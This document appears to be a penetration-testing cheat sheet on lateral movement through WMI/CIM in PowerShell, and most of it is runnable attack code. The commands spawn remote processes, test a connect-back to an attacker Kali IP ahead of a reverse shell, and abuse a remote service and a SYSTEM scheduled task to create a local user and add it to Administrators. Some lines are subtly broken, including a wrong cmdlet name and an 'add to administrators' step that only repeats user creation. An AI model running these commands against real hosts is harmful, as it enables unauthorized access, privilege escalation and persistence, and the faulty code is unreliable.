# Moving laterally using wmi

## Connecting to wmi from powershell

Create a credential object for authentication

    $username = 'user.name'
    $password = 'password' | ConvertTo-SecureString -AsPlainText -Force
    $credential = [pscredential]::new($username, $password)

Create a CIM session for repeated use:

* `DCOM`: Connect to the target via RPC on TCP/135 , RPC will direct the client to high numbered port TCP/49152-65535
* `WSman`: WinRM – connect via HTTP (TCP/5985) or HTTPS (TCP/5986)

```text
$server = 'target-ip / fqdn'
$sessionopt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName $server -Credential $credential -SessionOption $sessionopt -ErrorAction Stop
```

## Remote process creation

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI 
request to the Win32_Process class to spawn the process under the session we created before:

    $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value whatever";
    
    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = $Command
    }

WMI will create the required process silently (it does not show the output of any command).

On legacy systems, the same can be done using `wmic` from the command prompt:

    wmic.exe /user:<username> /password:<password> /node:TARGET process call create "cmd.exe /c calc.exe" 

## Run a command remotely

Run a command in the CIM session to test if the target can connect back to the attack machine as a pre-check to a 
reverse shell. Used is [Parameter splatting](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_splatting?view=powershell-7.2).
With many thanks to [0xBEN](https://benheater.com/).

    $kaliVpnIP = 'kali-vpn-ip'
    $kaliPort = 443
    
    # Try to connect back to Kali on a TCP port of choice
    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `"[Net.Sockets.TcpClient]::new().ConnectAsync('$kaliVpnIP', $kaliPort)`""

    # Parameter splatting
    $parameters = @{
        CimSession = $session
        ClassName = 'Win32_Process'
        MethodName = 'Create'
        Arguments = @{
            CommandLine = $command
        }
    }
    Invoke-CimSession @parameters

## Creating services remotely

Register a service called `fakeservice` on the target. This only creates the service and does not execute the command 
specified in `PathName`:

    $parameters = @{
        CimSession = $session
        ClassName = 'Win32_Service'
        MethodName = 'Create'
        Arguments = @{
            Name = 'fakeservice'
            DisplayName = 'fakeservice'
            PathName = 'net user <username> <password> /ADD'
            ServiceType = [byte]16
            StartMode = 'Manual'
        }
    }
    Invoke-CimMethod @parameters

Get the service and run it on the target. This will cause the service to run and create the local user `username` 
with a password of `password`.

    $svc = Get-CimInstance -CimSession $session -ClassName Win32_Service -Filter "Name LIKE 'fakeservice'"
    $svc | Invoke-CimMethod -MethodName StartService

Change the command and add the `username` user to the local Administrators group.

    $svc | Invoke-CimMethod -MethodName Change -Arguments @{PathName = 'net localgroup Administrators <username> /ADD'}
    $svc | Invoke-CimMethod -MethodName StartService

Cleanup:

    $svc | Invoke-Cimmethod -MethodName StopService
    $svc | Invoke-CimMethod -MethodName Delete

## Scheduled tasks

The action is to run: 

    cmd.exe /c net user add <username> <password> /ADD` . 

Payload must be split in `command` and `arguments`:

    $command = 'cmd.exe'
    $arguments = '/c net user <username> <password> /ADD'
    $parameters = @{
        CimSession = $session
        Execute = $command
        Argument = $arguments
    }
    $action = New-ScheduledTaskAction @parameters

Create the task on the remote host and assign it the action stored in the `$action` variable, then start the task:

    $parameters = @{
        CimSession = $session
        Action = $action
        User = 'NT AUTHORITY\SYSTEM'
        TaskName = 'taskname'
    }
    $task = Register-ScheduledTask @parameters
    $task | Start-ScheduledTask

Add the `username` user to the local administrators group:

    $arguments = '/c net user <username> <password> /ADD'
    $parameters = @{
        CimSession = $session
        Execute = $command
        Argument = $arguments
    }
    $action = New-ScheduledTaskAction @parameters
    $task = Set-ScheduledTask -CimSession $session -TaskName taskname -Action $action
    $task | Start-ScheduledTask
    $task | Unregister-ScheduledTask



